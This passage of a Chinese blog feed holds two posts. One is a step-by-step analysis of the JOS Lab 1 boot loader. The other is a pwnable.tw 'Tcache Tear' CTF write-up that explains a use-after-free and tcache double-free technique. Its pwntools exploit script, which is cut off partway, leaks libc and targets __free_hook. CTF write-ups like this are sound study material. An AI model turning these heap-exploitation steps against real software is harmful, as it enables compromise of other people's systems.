plain"><table><tr><td class="code"><pre><span class="line">1 # Bootstrap GDT</span><br><span class="line">2 .p2align 2                               # force 4 byte alignment</span><br><span class="line">3 gdt:</span><br><span class="line">4   SEG_NULL                               # null seg</span><br><span class="line">5   SEG(STA_X|STA_R, 0x0, 0xffffffff)      # code seg</span><br><span class="line">6   SEG(STA_W, 0x0, 0xffffffff)            # data seg</span><br><span class="line">7 </span><br><span class="line">8 gdtdesc:</span><br><span class="line">9   .word   0x17                           # sizeof(gdt) - 1</span><br><span class="line">10   .long   gdt                            # address gdt</span><br></pre></td></tr></table></figure><p>​    其中第三行的gdt是一个标识符，标识从这里开始就是GDT表了。可见这个GDT表中包括三个表项，分别代表三个段，null seg，code seg，data seg。由于xv6其实并没有使用分段基址，也就是说数据和代码都是写在一起的，所以数据段和代码段的起始地址都是0x0，大小都是0xffffffff=4GB。我们知道每个表项都是有三个字段的，那么这里第一个就是Flags字段，表示这个程序这个段的访问权限；中间的就是这个程序的这个段的起始地址；最后一个字段就是这个程序的这个段的大小。</p><p>​    在第4 ~ 6行是通过调用SEG()子程序来构造GDT表项的。这个子函数定义在mmu.h中，形式如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG(type,base,lim)                    \</span></span><br><span class="line">                  .word (((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>), ((base) &amp; <span class="number">0xffff</span>);    \</span><br><span class="line">                  .byte (((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), (<span class="number">0x90</span> | (type)),        \</span><br><span class="line">                  (<span class="number">0xC0</span> | (((lim) &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>)), (((base) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>​    可见函数需要三个参数，一个是type即这个段的访问权限，二是base，即这个段的起始地址，三是lim，即这个段的大小界限，每一个表项的结构如图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077181536/0" alt="image-20210123223910104"></p><p>​    然后gdtdesc处就要存放这个GDT表的信息了，其中0x17是这个表的大小-1 = 23，至于为什么，问就是不知道，是官方规定的，紧接着就是GDT表的起始地址gdt。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32   movl    %cr0, %eax</span><br><span class="line">33   orl     $CR0_PE_ON, %eax</span><br><span class="line">34   movl    %eax, %cr0</span><br></pre></td></tr></table></figure><p>​    接下来，当加载完GDT表的信息到GDTR寄存器之后。紧跟着3个操作，32 ~ 34指令。这几部操作明显是在修改CR0寄存器的内容。CR0寄存器还有CR1 ~ CR3寄存器都是80x86的控制寄存器。其中$CR0_PE_ON的开头定义了，值为0x1。可见上面的操作就是把CR0寄存器的0bit位置1，CR0寄存器的0bit是保护模式启动位，把这一位置1代表保护模式启动。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">35  ljmp    $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure><p>​    这只是一个简单的跳转指令，这条指令的目的在于把当前的运行模式切换为32位地址模式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protcseg:</span><br><span class="line">  # Set up the protected-mode data segment registers</span><br><span class="line">36  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector</span><br><span class="line">37  movw    %ax, %ds                # -&gt; DS: Data Segment</span><br><span class="line">38  movw    %ax, %es                # -&gt; ES: Extra Segment</span><br><span class="line">39  movw    %ax, %fs                # -&gt; FS</span><br><span class="line">40  movw    %ax, %gs                # -&gt; GS</span><br><span class="line">41  movw    %ax, %ss                # -&gt; SS: Stack Segment</span><br></pre></td></tr></table></figure><p>​    修改这些寄存器的值。这些寄存器都是段寄存器，如果刚加载完GDTR寄存器我们必须要重新加载所有的段寄存器的值，而其中CS段寄存器必须通过长跳转指令，即35号指令来进行加载。所有这些步骤是在第31号指令之后要做的，这样才能使GDTR的值生效。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Set up the stack pointer and call into C.</span><br><span class="line">42  movl    $start, %esp</span><br><span class="line">43  call bootmain</span><br></pre></td></tr></table></figure><p>​    接下来的指令就是要设置当前esp寄存器的值，然后准备正式跳转到main.c文件中的bootmain函数处。我们接下来分析一下这个函数的每一条指令。</p><h4 id="boot-main-c"><a href="#boot-main-c" class="headerlink" title="/boot/main.c"></a>/boot/main.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read 1st page off disk</span></span><br><span class="line"><span class="number">1</span> readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>​    这里首先调用了一个函数readseg，这个函数的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readseg(<span class="keyword">uint32_t</span> pa, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span><br></pre></td></tr></table></figure><p>​    它的功能从注释上来理解应该是，把距离内核起始地址offset个偏移量存储单元作为起始，将它和它之后的count字节的数据读出送入以pa为起始地址的内存物理地址处。</p><p>​    所以这条指令是把内核的第一个页（4096字节）的内容读取到内存地址ELFHDR（0x10000）处。其实完成这些相当于把操作系统映像文件的elf文件头部读取出来放入内存中。</p><p>​    读取完这个内核的elf头部信息后，需要对这个elf头部信息进行验证，并且也需要通过它获取一些重要信息。这里大致了解下elf头部，详细可见 <a href="http://wiki.osdev.org/ELF。">http://wiki.osdev.org/ELF。</a></p><p>​    elf文件：elf是一种文件格式，主要被用来把程序存放到磁盘上。是在程序被编译和链接后被创建出来的。一个elf文件包括多个段。对于一个可执行程序，通常包含存放代码的文本段（text section），用于存放全局变量的data段，存放字符串常量的rodata段。elf文件的头部就是用来描述这个elf文件如何在存储器中存储。这里需要注意，可链接文件和可执行文件会有不同的elf头部格式。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)</span><br><span class="line"><span class="number">3</span>        <span class="keyword">goto</span> bad;</span><br></pre></td></tr></table></figure><p>​    elf头部信息的magic字段是整个头部信息的开端。并且如果这个文件的格式的ELF的话，文件的elf-&gt;magic域应该是等于ELF_MAGIC的，ELF_MAGIC定义在<code>/inc/elf.h</code>中，所以这条语句就是判断这个输入文件是否是合法的elf可执行文件。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> ph = (struct Proghdr *) ((<span class="keyword">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff);</span><br></pre></td></tr></table></figure><p>​    我们知道头部中一定包含Program Header Table。这个表格存放着程序中所有段的信息。通过这个表我们才能找到要执行的代码段，数据段等等。所以我们要先获得这个表。</p><p>​    这条指令就可以完成这一点，首先elf是表头起址，而phoff字段代表Program Header Table距离表头的偏移量。所以ph可以被指定为Program Header Table表头。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span> eph = ph + ELFHDR-&gt;e_phnum;</span><br></pre></td></tr></table></figure><p>​    由于phnum中存放的是Program Header Table表中表项的个数，即段的个数。所以这不操作是把eph指向该表末尾。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span> <span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">    <span class="comment">// p_pa is the load address of this segment (as well</span></span><br><span class="line">    <span class="comment">// as the physical address)</span></span><br><span class="line"><span class="number">7</span>    readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br></pre></td></tr></table></figure><p>​    这个for循环就是在加载所有的段到内存中。ph-&gt;paddr是这个段在内存这种的物理地址。ph-&gt;off字段指的是这一个段的开头相对于elf文件的开头的偏移量。ph-&gt;filesz字段指的是这个段在elf文件中的大小。ph-&gt;memsz则指的是这个段实际被装入内存后的大小。通常来说memsz一定大于等于filesz，因为段在文件中时许多未定义的变量并没有分配空间给它们。</p><p>​    所以这个循环就是在把操作系统内核的各个段从外存读入内存中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span> ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) (ELFHDR-&gt;e_entry))();</span><br></pre></td></tr></table></figure><p>​    e_entry字段指向的是这个文件的执行入口地址。所以这里相当于开始运行这个文件。也就是内核文件。自此就把CPU的控制权从boot loader转交给了操作系统的内核。</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>下面我们来完成exercise让我们做的事。</p><p>首先是第一部分，对boot.S程序的跟踪，我们用gdb来操作。</p><p>打开gdb后我们输入<code>b *0x7c00</code>，然后输入c，表示继续运行到断点处。在这里我们输入 <code>x/30i 0x7c00</code>后显示如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13079377559/0" alt="image-20210124155519069"></p><p>这条gdb指令是把存放在0x7c00以及之后30字节的内存里面的指令反汇编出来，我们可以拿它直接和<code>boot.S</code>以及<code>obj/boot/boot.asm</code>进行比较</p><p>首先是obj/boot/boot.asm</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13080767453/0" alt="image-20210124222312820"></p><p>然后是boot.S</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13080771652/0" alt="image-20210124222418124"></p><p>可见这三者在指令上没有区别，只不过在源代码boot.S中，我们指定了很多标识符比如set20.1，.start，这些标识符在被汇编成机器代码后都会被转换成真实物理地址。比如set20.1就会被转换成0x7c0a，那么在obj/boot/boot.asm中还把这种关系列出来了，但是在真实执行时，即第一种情况时，就看不到set20.1标识符了，完全是真实物理地址。</p><p>紧接着是exercise是第二部分</p><p>对bootmain函数中的语句逐一分析，首先在boot.S中的最后一句是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 call boot main</span><br></pre></td></tr></table></figure><p>​    call指令将会把返回地址压入栈中，然后把bootmain的起始地址赋给%eip寄存器，这里这条语句执行后%eip的值变为0x7d15</p><p>​    从obj/boot/boot.asm文件中，正好可以看见bootmain函数的汇编形式：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13087940337/0" alt="image-20210126161838408"></p><p>​    可见bootmain翻译成汇编程序的第一条指令是<code>push %ebp</code>，地址为0x7d15。正好和%eip的值对上。另外%esp寄存器的值由0x7c00变成了0x7bfc（0x7c00-4）。其中栈顶此时存放的是boot.S运行时的返回地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088028986/0" alt="image-20210126163617801"></p><p>​    然后我们正式开始分析bootmain函数，上面的四句汇编代码是进行调用过程时，被调用过程必须要事先执行的一些通用的任务，如保存栈帧等。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 7d15:  55                    push   %ebp</span><br><span class="line">2 7d16:  89 e5                 mov    %esp,%ebp</span><br></pre></td></tr></table></figure><p>​    这两句就是在修改栈帧界限的信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3 7d18:  56                     push   %esi</span><br><span class="line">4 7d19:  53                     push   %ebx</span><br></pre></td></tr></table></figure><p>​    这两句操作就是在备份%esi，%ebx的值，因为这两个寄存器叫做被调用这保存寄存器，即如果要在子过程中使用它们，那么在子过程开头必须先备份这些寄存器的值。</p><p>​    那么此时%esp的值为0x7bf0，而%ebp的值设置为0x7bf8。可见进入bootmain函数后，把0x7c00之前的低地址空间拿来作为栈帧使用。</p><p>然后我们接着看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read 1st page off disk</span></span><br><span class="line"><span class="number">1</span> readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088078725/0" alt="image-20210126164600317"></p><p>​    <strong>首先0x7d1a ~ 0x7d21这三条指令的目的是为了把三个输入参数压入栈帧之中（32位入参顺序为从右到左），以供readseg子过程调用，%esp寄存器的值也随之改变为0x7be4。此时0x7d26执行，调用readseg子过程，该子过程的第一条指令地址为0x7cdc。</strong>调用call时，会把bootmain下一个要执行的指令地址0x7d2b，也就是返回地址压入栈顶0x7be0中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088123645/0" alt="image-20210126165312487"></p><p>​    然后就是进入readseg函数，开头依旧是保存栈帧和要使用的寄存器</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088138256/0" alt="image-20210126165531013"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 0x10(%ebp), %edi</span><br></pre></td></tr></table></figure><p>这条指令是要取出第三个输入参数即0，到%edi寄存器中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088177150/0" alt="image-20210126170200479"></p><p>​    接下来的语句如上，0xc(%ebp)是第二个参数，0x8(%ebp)是第一个参数。那么到这里就是第三个参数放入了%edi，第二个参数放入了%esi，第一个参数放入了%ebx。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shr $0x9 %edi</span><br></pre></td></tr></table></figure><p>  <strong>由于shr是汇编逻辑右移指令，而%edi中存放的是第3个参数值，offset，将这个offset逻辑右移9位正好等于把offset的除以512即SECTSIZE，所以就是在完成</strong></p><p>  <strong>offset = (offset / SECTSIZE) + 1指令的其中一部分。这条c语言指令的功能是计算要读取这段区域的第一个扇区的扇区号。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add  %ebx, %esi</span><br></pre></td></tr></table></figure><p>　 <strong>由于%ebx中存放的是第1个参数pa，%esi中存放的是第2个参数0x1000(即4096)，那么这条指令完成的就是C语言语句：</strong></p><p>　  <strong>end_pa = pa + count;</strong></p><p>   这句指令是让end_pa指向要被读取到内存的这块数据所存放的最后一个位置的地址。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inc %edi</span><br></pre></td></tr></table></figure><p>　这条语句很好理解就是在完成C语言语句 <strong>offset = (offset / SECTSIZE) + 1</strong>中的加1的部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and $0xfffffe00, %ebx</span><br></pre></td></tr></table></figure><p>　这条语句完成的是C语言语句： <strong>pa &amp;= ~(SECTSIZE-1)</strong> </p><p>　功能就是把pa重新定向到offset存储单元所在的扇区的起始地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088322100/0" alt="image-20210126172332302"></p><p>​    此时开始进入while循环，即开始把外存中的数据传输到内核。这里判断%ebx和%esi的值的大小，其中%ebx存放的就是指针pa，而%esi存放的是指针end_pa。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088353033/0" alt="image-20210126172805812"></p><p>​    接下来三条语句是在为调用readsec函数做准备，把输入参数先压入栈中。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088366512/0" alt="image-20210126173010006"></p><p>​    接下来进入readsect函数中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088392952/0" alt="image-20210126173427550"></p><p>​    readsect函数会调用一个子函数，waitdisk()，这个函数用于查询当前磁盘的状态是否已经准备好进行操作。如果没有准备好，那么程序就会一直停在这里，知道磁盘准备好</p><p>​    根据main.c文件中，我们可以看到在readsect函数中，waitdisk操作之后调用了一系列的outb子函数，这个子函数起始就是汇编语言中的outb汇编指令，它属于IO端口命令，IO端口指令用于向外部设备的端口输出指令，或从外部设备的端口读入数据。<strong>那么outb就是输出一个字节到指定端口。</strong></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088450428/0" alt="image-20210126174202756"></p><p>​    以第一个为例子，这先把端口号送入%edx，然后输出数据送入%al中，然后调用out汇编命令。</p><p>那么后边的命令就是完成后续的所有outb操作，只不过端口号和数据有所差别。<strong>通过这些指令可以看出，系统是先想0x1F2端口送入一个值1，代表取出一个扇区，然后向0x1F3~0x1F6中送入你要读取的扇区编号的32bit表示形式。最后向0x1F7端口输出0x20指令表示要读取这个扇区。</strong></p><p>那么输入完上述地址，指令到相应的端口后，就可以让磁盘自己去工作，此时系统只需调用waitdisk过程来等待磁盘完成读取。waitdisk退出后，代表数据已经被读取。然后就可以执行下一个指令了。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088473926/0" alt="image-20210126174607745"></p><p>​    下一个指令又是一个IO端口指令，insl，这个函数包含三个参数，port代表端口号，addr代表这个扇区存放在主存中的起始地址，cnt则代表读取的次数。repnz指令又叫做重复串操作指令，它是一个前缀，位于一条指令之前，这条指令将会一直被重复执行，并且直到计数寄存器的值满足某个条件。repnz指令是当计数器%ecx的值不为零是就一直重复后面的串操作指令。那么被重复调用的指令就是insl指令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insl (%dx), %es:(%edi)</span><br></pre></td></tr></table></figure><p>这个指令中，%dx中存放着要访问的端口号，0x1f0。该指令的目的就是把端口0x1f0中的数据传输给后面所指向的地址。而后面的地址采用%es:(%edi)格式，其中%edi中存放的就是要被存放的内存空间的起始地址。由于当前计数寄存器%ecx中存放的数值为128，代表我们进行128次存取操作就能读取512byte的扇区。所以每次存取4个字节。我们调试验证下：</p><p>刚执行完cld指令后，查询寄存器信息。edx存放的是0x1f0端口号，edi存放的是pa起始地址，0x10000，存放在0x10000 ~ 0x10005的是：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088512998/0" alt="image-20210126175306126"></p><p>执行完一次insl操作后，端口号没变，而edi变成了0x10004，此时内容变成了：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088531899/0" alt="image-20210126175631635"></p><p>可见我们一次操作读取四个字节。所以我们只需要调用128次，就能完成512字节的存储。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088555629/0" alt="image-20210126180025347"></p><p>执行完后返回，这就是读取一个扇区readsect子函数的整个过程</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088585578/0" alt="image-20210126180509792"></p><p>readsect执行完后，又会继续执行<code>while (pa &lt; end_pa)</code>判断，如果还是小于，说明该段包含多个扇区，这些扇区还没有读取完成。当读取到end_pa之后，准备退出readset，最后执行readseg退出之前的操作：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088611173/0" alt="image-20210126180817331"></p><p>这里就是恢复bootmain函数的栈帧，回到bootmain中。</p><p>回到bootmain后，由于我们的这个操作读取出来的数据块是内核的第一个块，里面存放的是内核文件的elf文件头。所以我们下一步要做的事情是验证读出的文件是不是一个有效的elf文件？其中一个文件如果是有效的elf文件，那么这个文件的ELF文件头部的头四个字节分别是0x7f，’E’，’L’，’F’。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088905655/0" alt="image-20210126190604792"></p><p>紧接着是</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13088910632/0" alt="image-20210126190654224"></p><p>0x7d3a指令完成是上面那条C语言操作的一部分。先把ELF文件头部e_phoff字段的值存入%eax。这个字段中存放的是Program Header Table（段头部表）的起始地址在文件中的偏移。而这个e_phoff字段是elf头部字段中的第28个字节到31个字节。所以起始地址是0x1000+1c = 0x1001c。所以%eax中存放着Program Header Table的起始地址的偏移。</p><p>0x7d3f指定就是把e_phnum字段的值，读入到%esi中，该字段代表代表Program Header Table中表项的个数。</p><p>在这里我们就知道了操作系统内核一共有多少个段，以及段表起始地址。通过info register指令查看，%esi的值为3，%eax的值为0x34，即52。可见操作系统内核文件一共3个段，段表起始地址在相对于内核文件起始地址的0x34处。而EFL文件头大小就是52，所以段表紧挨着ELF文件头。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089086052/0" alt="image-20210126194728377"></p><p>接下来就是求出Program Header Table一共占了多少个字节，并得出Program Header Table最后一个存储单元的地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089093176/0" alt="image-20210126194922938"></p><p>接下来就进入for循环，这个循环的操作就是要把内核的每一段从外存取到内存。其中%esi存放的是表尾地址，而%ebx存放的是当前访问到表中的位置。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089111956/0" alt="image-20210126195345212"></p><p>for里的唯一操作是：ph当前存放的是一个Program Header Table中一个表项的起始地址。ph-&gt;p_pa字段就是p_paddr字段，代表这个段的将要被存放在这个系统的内存中的起始地址。ph-&gt;p_memsz字段，代表这个段被实际的装入内存后，它所占用的内存大小。ph-&gt;p_offset字段，代表这个段的起始地址距离整个内核文件起始地址的偏移。所以这个C语句的含义就是把这个表项所代表的段存放到ph-&gt;p_pa字段的所指的的内存地址处。</p><p>循环执行完后，操作系统内核中所有的指令，数据都已经转移到内存中。下面就是要执行最后一步</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13089138590/0" alt="image-20210126200015236"></p><p>其中ELF文件头的e_entry字段的含义是这个可执行文件的第一条指令的虚拟地址。所以这句的含义是把CPU的控制权转移给操作系统内核。</p><p>结束~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Lab-1-Exercise-3：&quot;&gt;&lt;a href=&quot;#Lab-1-Exercise-3：&quot; class=&quot;headerlink&quot; title=&quot;Lab 1 Exercise 3：&quot;&gt;&lt;/a&gt;Lab 1 Exercise 3：&lt;/h2&gt;&lt;h3 id=&quot;任务&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>[Pwnable.tw]Tcache Tear</title>
    <link href="https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/"/>
    <id>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/</id>
    <published>2021-01-23T01:13:34.396Z</published>
    <updated>2021-01-23T15:15:24.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ file main</span><br><span class="line">main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br><span class="line">$ checksec main</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;C7&#x2F;pwn&#x2F;tw&#x2F;tcache_tear&#x2F;main&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>64位动态链接，去符号表，got表不可写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ strings libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br></pre></td></tr></table></figure><p>libc为2.27</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先会输入一个名字会存到bss段上，然后就是常规的菜单题，malloc和free和info，这里的free只能对当前最新申请的chunk进行操作，info会打印bss段上0x20字节的内容。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul><li><code>free()</code>没有对指针清零，存在UAF</li><li><code>add()</code>中读入的<code>size-16</code>参数经过<code>sub_400A25()</code>后由有符号变成了无符号，如果size是小于16的，那么转换后会变成一个很大的无符号数，存在溢出。</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做题的首要思路就是先考虑如何泄露出libc基址，一般的泄露方式就是申请一个chunk，释放后将其放入unsorted bin中。这里限制了chunk的size，即使我们填满了tcache后还是只能进入fast bin，没法进入unsorted bin中。默认情况下，tcache中的单链表个数是64个，64位下可容纳的最大内存块大小是1032(0x408)，故我们只要申请一个size大于0x408的堆块，然后free就会进入unsorted bin，而不会进入tcache。但是这里限制了申请大小，所以我们要伪造一个chunk，并将其释放。</p><p>这里需要注意的是<strong>除了伪造的size要大于0x408，并且伪堆块后面的数据也要满足基本的堆块格式，就是说还得伪造两个chunk。</strong>因为在free中，会对当前chunk后面的chunk进行一系列检查：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 _int_free 函数中 </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line"><span class="comment">/* get and clear inuse bit */</span> </span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br></pre></td></tr></table></figure><p>可以看到free函数对当前堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的xinuse位，到这里我们都以为只要伪造2个chunk就够了，但是nextchunk的inuse位的信息在nextchunk的nextchunk中，所以我们总共要伪造3个chunk。第一个chunk我们构造大小位0x500，第二个和第三个为0x20，它们的prev_inuse都为1，防止free后将它们合并。</p><p>这里我们具体的做法就是利用一开始的输入name，伪造好0x500的chunk后，在利用tcache的double free的特性（<strong>注意新版的2.27中加入了double free的检测</strong>），来达到任意地址申请堆块，相当于任意地址写，将后两个0x20的堆块伪造好，将伪造的0x500申请过来后释放即可，因为tcache不会check堆块的size，所以我们只需要fd指向的是伪造的chunk，不用担心size会被check。此时我们利用info功能将main_arena的地址打印出来后得到libc_base，然后继续利用tcache的double free将堆块申请到free_hook中，将free_hook改为one_gadget即可。</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10207)</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x602060</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">payload = p64(name + <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x50</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64(<span class="number">0</span>)+ p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">payload = p64(name+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x20</span>,payload)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook= &quot;</span>+<span class="built_in">hex</span>(free_hook)</span><br><span class="line">local_og = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">remote_og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base + local_og[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span 